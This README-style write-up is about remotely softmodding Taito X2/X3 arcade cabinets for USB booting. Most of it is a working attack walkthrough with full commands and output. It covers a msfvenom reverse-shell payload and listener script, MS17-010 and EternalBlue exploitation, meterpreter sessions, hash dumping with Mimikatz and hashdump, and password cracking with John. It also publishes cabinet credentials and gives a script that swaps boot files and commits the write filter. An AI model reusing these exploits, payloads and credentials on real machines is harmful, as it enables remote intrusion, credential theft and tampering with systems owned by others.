```
Big Thanks to Mitsurugi_w, Darksoft, and Brizzo for finally allowing this to be published. 
- written by *hostile*, with supporting information from *fsckewe*
```
![alt text](https://raw.githubusercontent.com/ArcadeHustle/X3_USB_softmod/master/darksoft.jpeg) ![alt text](https://raw.githubusercontent.com/ArcadeHustle/X3_USB_softmod/master/walsdawg.jpeg) ![alt text](https://raw.githubusercontent.com/ArcadeHustle/X3_USB_softmod/master/arcadeprojects.jpeg)

```
It is 2019! We can finally put the old "this hardware is too new and still in use, so we don't want to see posted information about how to clone or defeat protection" arguement to rest. 

Exemptions to Prohibition against Circumvention of Technological Measures Protecting Copyrighted Works – Seventh Triennial Section 1201 Final Rule, Effective October 28, 2018
https://library.osu.edu/document-registry/docs/1027/stream
"Video games in the form of computer programs, where outside server support has been discontinued, to allow individual play and preservation by an eligible library, archive, or museum"

https://library.osu.edu/site/copyright/2019/03/20/2018-dmca-section-1201-exemptions-announced/
"Video games in the form of computer programs, lawfully acquired as complete games 37 CFR §201.40(b)(12)" 
"For personal, local gameplay; or To allow preservation in a playable format..."

For now some of this information will be further gatekept. This will write up will absolutly however give you all the access you need to enable USB bootable games... 
Making a "multi" out of this is trivial. You can, as many folks have pointed out, use *any* front end, Niko's, Joerg's or AttractMode as examples. 

You can obtain initial access, either remotely, or physically. Folks have been doing similar things with local access (in private) for years. 

For notes on exploiting physical access see the following document: 
Bypassing Self-Encrypting Drives (SED) in Enterprise Environments. 
https://www.blackhat.com/docs/eu-15/materials/eu-15-Boteanu-Bypassing-Self-Encrypting-Drives-SED-In-Enterprise-Environments.pdf

We personally prefer the remote *no screw driver* "softmod" approach. You will need an X2 or X3 that boots. X2 and X3 both have their own boot nuances. Explaining their boot 
requirements is outside the scope of this write up. 

In order to participate from here you will need a basic understanding of Metasploit.
https://github.com/rapid7/metasploit-framework
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit

If you have no clue what Metasploit is, please contact Darksoft or Mitsurugi_w on Arcade Projects forum and ask for help with the X3 softmod. 
https://www.arcade-projects.com/forums/index.php?board/71-taito-type-x/

For information on NesicaXlive games that have been "preserved" please stop by the following thread on Arcade Projects:
https://www.arcade-projects.com/forums/index.php?thread/5772-nesicaxlive-preservation/

Remote exploitation Example 1:
- Taito X2 (Street Fighter 4 Version 1.00)
The x2 appears vulnerable to both CVE-2008-4250 and CVE-2017-0143, but finding a proper exploit can be tricky because of the embedded XP variant on SP2 with JP locale

We will use a standalone exploit published about 11 months ago, instead of Metasploit to gain initial access: 
https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py

First we make an executable meterpreter payload, and generate an .rc script for our metasploit listener. 
$  ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.69.64 LPORT=4443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
$ cat x2.rc 
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lport 4443
set lhost 192.168.69.64
set ExitOnSession false
exploit

Start the listener
$ ./msfconsole -qr x2.rc 
[*] Processing x2.rc for ERB directives.
resource (x2.rc)> use exploit/multi/handler
resource (x2.rc)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (x2.rc)> set lport 4443
lport => 4443
resource (x2.rc)> set lhost 192.168.69.64
lhost => 192.168.69.64
resource (x2.rc)> set ExitOnSession false
ExitOnSession => false
resource (x2.rc)> exploit

Launch the exploit so that the x2 runs our meterpreter payload. 
$ python send_and_execute.py 192.168.69.112 ms17-010.exe
Trying to connect to 192.168.69.112:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x856d0da8
SESSION: 0xe19b9268
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1a19d28
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1a19dc8
overwriting token UserAndGroups
Sending file UI4KCA.exe...
Opening SVCManager on 192.168.69.112.....
Creating service EwFi.....
Starting service EwFi.....
The NETBIOS connection with the remote host timed out.
Removing service EwFi.....
ServiceExec Error on: 192.168.69.112
nca_s_proto_error
Done


Back on the msfconfole you will see:
[*] Started reverse TCP handler on 192.168.69.64:4443 
[*] Sending stage (179779 bytes) to 192.168.69.112
[*] Meterpreter session 1 opened (192.168.69.64:4443 -> 192.168.69.112:1034) at 2019-08-02 01:35:47 -0400


meterpreter > sysinfo
Computer        : OEM-JKAI6ZX8VT3
OS              : Windows XP (Build 2600, Service Pack 2).
Architecture    : x86
System Language : ja_JP
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

From here you can dump the hashes required for the second stage. 
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 884bb6156c03009f8b8abb02d64adeee...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
netguest:1000:c05a21cfc28a6e52417eaf50cfac29c3:a190d832152c3d35ee787d26ed371acb:::

Cracking the hashes is trivial. 
$ john pass --format=NT
Loaded 3 password hashes with no different salts (NT [MD4 128/128 X2 SSE2-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
netguest         (netguest)
                 (Administrator)
                 (Guest)
3g 0:00:00:00 DONE 2/3 (2019-08-01 16:54) 300.0g/s 180900p/s 180900c/s 365000C/s 123456..maggie
Use the "--show" option to display all of the cracked passwords reliably
Session completed

We can now use the netguest / netguest user and password in the second stage softmod process. *YOU* the reader don't even have to go through stage one, 
simply use the password shared above, and move on to stage two. 

Remote exploitation Example 2:
- Taito X3 (Left4Dead ver ??, torn sticker shows it was [factory?] updated from Gunslinger Stratos ver ??)

For the X3 we will use the Eternal Blue module in metasploit https://en.wikipedia.org/wiki/EternalBlue

msf5 exploit(windows/smb/ms17_010_psexec) > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.69.91
msf5 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.69.64:4444 
[+] 192.168.69.91:445     - Host is likely VULNERABLE to MS17-010! - Windows Embedded Standard 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.69.91:445 - Connecting to target for exploitation.
[+] 192.168.69.91:445 - Connection established for exploitation.
[+] 192.168.69.91:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.69.91:445 - CORE raw buffer dump (45 bytes)
[*] 192.168.69.91:445 - 0x00000000  57 69 6e 64 6f 77 73 20 45 6d 62 65 64 64 65 64  Windows Embedded
[*] 192.168.69.91:445 - 0x00000010  20 53 74 61 6e 64 61 72 64 20 37 36 30 31 20 53   Standard 7601 S
[*] 192.168.69.91:445 - 0x00000020  65 72 76 69 63 65 20 50 61 63 6b 20 31           ervice Pack 1   
[+] 192.168.69.91:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.69.91:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.69.91:445 - Sending all but last fragment of exploit packet
[*] 192.168.69.91:445 - Starting non-paged pool grooming
[+] 192.168.69.91:445 - Sending SMBv2 buffers
[+] 192.168.69.91:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.69.91:445 - Sending final SMBv2 buffers.
[*] 192.168.69.91:445 - Sending last fragment of exploit packet!
[*] 192.168.69.91:445 - Receiving response from exploit packet
[+] 192.168.69.91:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.69.91:445 - Sending egg to corrupted connection.
[*] 192.168.69.91:445 - Triggering free of corrupted buffer.
[*] Sending stage (206403 bytes) to 192.168.69.91
[*] Meterpreter session 2 opened (192.168.69.64:4444 -> 192.168.69.91:49161) at 2019-08-01 22:04:55 -0400
[+] 192.168.69.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.69.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.69.91:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter > sysinfo
Computer        : WINDOWS-TUNJ16P
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : ja_JP
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows

We will use Mimikatz as a means to demonstrate an alternate method to dump the hashes required for state two. 

meterpreter > cd /
meterpreter > upload /Users/darksoft/Downloads/mimikatz_trunk/x64 .
[*] uploading  : /Users/darksoft/Downloads/mimikatz_trunk/x64/mimilib.dll -> .\mimilib.dll
[*] uploaded   : /Users/darksoft/Downloads/mimikatz_trunk/x64/mimilib.dll -> .\mimilib.dll
[*] uploading  : /Users/darksoft/Downloads/mimikatz_trunk/x64/mimidrv.sys -> .\mimidrv.sys
[*] uploaded   : /Users/darksoft/Downloads/mimikatz_trunk/x64/mimidrv.sys -> .\mimidrv.sys
[*] uploading  : /Users/darksoft/Downloads/mimikatz_trunk/x64/mimikatz.exe -> .\mimikatz.exe
[*] uploaded   : /Users/darksoft/Downloads/mimikatz_trunk/x64/mimikatz.exe -> .\mimikatz.exe
meterpreter > shell
Process 1572 created.
Channel 4 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2010 Microsoft Corporation.  All rights reserved.

C:\>cd /
cd /

C:\>mimikatz
mimikatz

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 20 2019 22:57:37
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

...

Authentication Id : 0 ; 98755 (00000000:000181c3)
Session           : Interactive from 1
User Name         : oem
Domain            : WINDOWS-TUNJ16P
Logon Server      : WINDOWS-TUNJ16P
Logon Time        : 2019/08/02 10:38:51
SID               : S-1-5-21-2247147016-1392460751-1571210327-1000
	msv :	
	 [00000003] Primary
	 * Username : oem
	 * Domain   : WINDOWS-TUNJ16P
	 * LM       : 31b28f123b9f757393e28745b8bf4ba6
	 * NTLM     : 424eded08f322383c2e24b09076121a0
	 * SHA1     : c30c7f0328be8043fd30b3a54f6c58c94485a3d7
	wdigest :	
	 * Username : oem
	 * Domain   : WINDOWS-TUNJ16P
	 * Password : TDEGpass
	kerberos :	
	 * Username : oem
	 * Domain   : WINDOWS-TUNJ16P
	 * Password : TDEGpass
	ssp :	
	credman :	


You can see that Mimikatz was able to dump a clear text version of the password alongside the hashes, no JtR required. Alternately you could dump the hashes and try to crack the password. 

meterpreter > run post/windows/gather/hashdump 

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY ddd5f8aa2cd1c8ea28af02f4b001e602...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dd15de8b4bfef969f764a3e9787a367:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
oem:1000:aad3b435b51404eeaad3b435b51404ee:424eded08f322383c2e24b09076121a0:::

Either way you obtain it, you can now use the oem / TDEGpass combination in the second stage. 

Please note that some games may have *other* variations on username and password combination. 

*fsckewe* has submited the following extra variants:

typex:1001:aad3b435b51404eeaad3b435b51404ee:74bdc8536b32d06366f50299f4baa62c:::
$ john --format=NT --wordlist=passwd typexhash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates left, minimum 24 needed for performance.
TDEGPass         (typex)
1g 0:00:00:00 DONE (2019-08-01 23:06) 50.00g/s 100.0p/s 100.0c/s 100.0C/s TDEGpass..TDEGPass
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed

Please note that the typex password has an uppercase "P" where as the oem user uses a lowercase "p". 

Second Stage:
- Leveraging access for lateral movement

This repo comes with 2 examples for you to build on. We've already used them to enable ourselves to boot off of any USB device we wish. You can too... 

$ ls *rc *meter *sh
SFIV.meter		SFIV.rc			l4dac.meter		l4dac.rc		softmod-l4dac.sh	softmod-sfiv.sh

For this exercise you will ultimately need a replacement TDEGBoot.exe or launcher.exe if you seek to make a USB bootable machine. We will NOT be providing those replacement files at this time. 

Converting the provided .sh files to .bat for Windows users should be simple enough. We will update this repo with more *user friendly* options as time permits. 

The most important files are the .meter files, as they are the scripted meterpreter commands used to create the softmod. Make sure you understand how they work before attempting to use this repo. 

$ cat l4dac.meter
execute -i -f "cmd.exe" -a "/c echo FukkaDarkSoft!"

pkill TDEGBoot.exe

cd /
rm TDEGBoot.exe.l4dac
mv TDEGBoot.exe TDEGBoot.exe.l4dac
upload ./TDEGBoot.exe  C:\\TDEGBoot.exe
upload ./iDmacDrv32.dll C:\\Windows\\System32

execute -i -f "c:\\Windows\\winsxs\\amd64_microsoft-windows-e..enhancedwritefilter_31bf3856ad364e35_6.1.7601.17514_none_098c89c5afa1c48b\\ewfmgr.exe" -a "c: -commit"

reboot
quit

Official video tutorial for the Taito X3 USB boot softmode by Mitsu (as usual!) can be found here: https://www.youtube.com/watch?v=l0nq1pQXX90

```
